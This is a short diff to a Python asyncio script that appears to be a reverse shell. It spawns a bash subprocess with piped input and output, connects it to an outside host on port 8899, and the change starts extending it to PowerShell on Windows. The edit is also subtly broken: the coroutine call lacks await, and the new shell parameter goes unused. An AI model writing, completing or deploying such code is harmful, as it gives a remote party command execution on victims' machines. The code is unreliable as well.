@@ -5,9 +5,9 @@ HOST = "erzhanoriez.winogrona.cc"
 PORT = 8899
 
 async def main_windows():
-    print('Windows')
+    main_unix("powershell.exe")
 
-async def main_unix():
+async def main_unix(exe="bash"):
     shell = await asyncio.create_subprocess_shell("bash", stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
 
     (reader, writer) = await asyncio.open_connection(HOST, PORT)
